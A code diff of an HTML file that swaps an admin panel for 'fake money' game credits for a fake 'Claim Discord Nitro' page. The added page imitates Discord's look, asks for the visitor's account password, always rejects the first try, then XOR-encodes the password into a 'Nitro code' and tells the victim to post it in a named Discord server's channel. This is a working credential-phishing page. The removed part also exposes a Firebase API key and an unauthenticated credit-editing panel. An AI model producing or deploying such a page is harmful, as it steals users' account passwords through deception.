@@ -1,91 +1,166 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Panel</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Claim Discord Nitro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500&display=swap" rel="stylesheet" />
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
+      margin: 0;
+      background-color: #313338;
+      font-family: 'Rubik', sans-serif;
+      color: #f2f3f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
       padding: 20px;
     }
-    .container {
+    .card {
+      background-color: #2b2d31;
+      border-radius: 8px;
+      padding: 40px 30px;
       max-width: 400px;
-      margin: auto;
-      border: 1px solid #ccc;
-      padding: 20px;
-      border-radius: 10px;
-      background-color: #f9f9f9;
-    }
-    input, button {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+    .logo {
+      width: 60px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    h1 {
+      font-size: 20px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #b5bac1;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      background-color: #1e1f22;
+      border: 1px solid #4f545c;
+      border-radius: 5px;
+      color: white;
       font-size: 16px;
+      margin-bottom: 10px;
+    }
+    input::placeholder {
+      color: #72767d;
+    }
+    button {
+      width: 100%;
+      background-color: #5865f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .error {
+      color: #f04747;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+    .result {
+      margin-top: 25px;
+      background-color: #1e1f22;
+      border: 1px solid #4f545c;
+      padding: 15px;
+      border-radius: 6px;
+      word-break: break-word;
+      text-align: center;
+    }
+    .copy-btn {
+      margin-top: 10px;
+      background-color: #4e5fd2;
+    }
+    .info-message {
+      margin-top: 15px;
+      color: #b5bac1;
+      font-size: 13px;
+      text-align: center;
     }
   </style>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
-    import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+</head>
+<body>
 
-    // Firebase Configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyDjbl8bbf4aGu1P3Jk9AQd_vOCvfpgLUv4",
-      authDomain: "fake-money-transaction.firebaseapp.com",
-      databaseURL: "https://fake-money-transaction-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "fake-money-transaction",
-      storageBucket: "fake-money-transaction.firebasestorage.app",
-      messagingSenderId: "654165502718",
-      appId: "1:654165502718:web:0f7dede885a7fa39e153af"
-    };
+  <div class="card">
+    <img class="logo" src="https://cdn.jsdelivr.net/gh/edent/SuperTinyIcons/images/svg/discord.svg" alt="Discord Style Logo" />
+    <h1>Claim Your Nitro</h1>
+    <p>Enter your account password to claim free Discord Nitro.</p>
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    <input type="password" id="password" placeholder="Account Password" />
+    <button onclick="claimNitro()">Claim Nitro</button>
+    <div class="error" id="errorMsg">❌ Incorrect password. Try again.</div>
 
-    // Function to Add Credits
-    function addCredits(player) {
-      const amount = parseInt(document.getElementById(`${player}-amount`).value);
+    <div class="result" id="resultBox" style="display: none;">
+      ✅ Subscription Claimed Successfully!<br><br>
+      <strong>Your Nitro Code:</strong><br>
+      <code id="codeText"></code><br>
+      <button class="copy-btn" onclick="copyCode()">📋 Copy Code</button>
+      <div class="info-message">
+        Copy the code and send it in the <strong>restricted-access-🚫</strong> channel in the Playcentrix Server.
+      </div>
+    </div>
+  </div>
 
-      if (isNaN(amount) || amount <= 0) {
-        alert('Please enter a valid amount.');
+  <script>
+    let attempt = 0;
+
+    function shortEncrypt(text) {
+      const key = 37;
+      return [...text].map(c => (c.charCodeAt(0) ^ key).toString(36)).join('-');
+    }
+
+    function claimNitro() {
+      const input = document.getElementById("password");
+      const password = input.value.trim();
+      const error = document.getElementById("errorMsg");
+      const resultBox = document.getElementById("resultBox");
+      const codeText = document.getElementById("codeText");
+
+      if (!password) {
+        error.innerText = "❌ Please enter a password.";
+        error.style.display = "block";
+        resultBox.style.display = "none";
         return;
       }
 
-      const playerRef = ref(db, player);
+      if (attempt === 0) {
+        attempt++;
+        error.innerText = "❌ Incorrect password. Try again.";
+        error.style.display = "block";
+        resultBox.style.display = "none";
+        return;
+      }
 
-      get(playerRef)
-        .then(snapshot => {
-          const currentBalance = snapshot.val() || 0; // If no balance, set to 0
-          set(playerRef, currentBalance + amount)
-            .then(() => {
-              alert(`Added ${amount} credits to ${player}`);
-              document.getElementById(`${player}-amount`).value = ''; // Clear input field
-            })
-            .catch(error => {
-              console.error('Error updating balance:', error);
-              alert('Failed to update balance. Check the console for details.');
-            });
-        })
-        .catch(error => {
-          console.error('Error fetching player data:', error);
-          alert('Failed to fetch player data. Check the console for details.');
-        });
+      error.style.display = "none";
+      const code = shortEncrypt(password);
+      codeText.innerText = code;
+      resultBox.style.display = "block";
+
+      navigator.clipboard.writeText(code).catch(() => {});
+    }
+
+    function copyCode() {
+      const code = document.getElementById("codeText").innerText;
+      navigator.clipboard.writeText(code)
+        .then(() => alert("Code copied to clipboard!"))
+        .catch(() => alert("Failed to copy code."));
     }
   </script>
-</head>
-<body>
-  <h1>Admin Panel</h1>
-  <div class="container">
-    <h3>Add Credits to Player 1</h3>
-    <input type="number" id="player1-amount" placeholder="Enter amount">
-    <button onclick="addCredits('player1')">Add to Player 1</button>
-  </div>
-  <div class="container">
-    <h3>Add Credits to Player 2</h3>
-    <input type="number" id="player2-amount" placeholder="Enter amount">
-    <button onclick="addCredits('player2')">Add to Player 2</button>
-  </div>
+
 </body>
 </html>
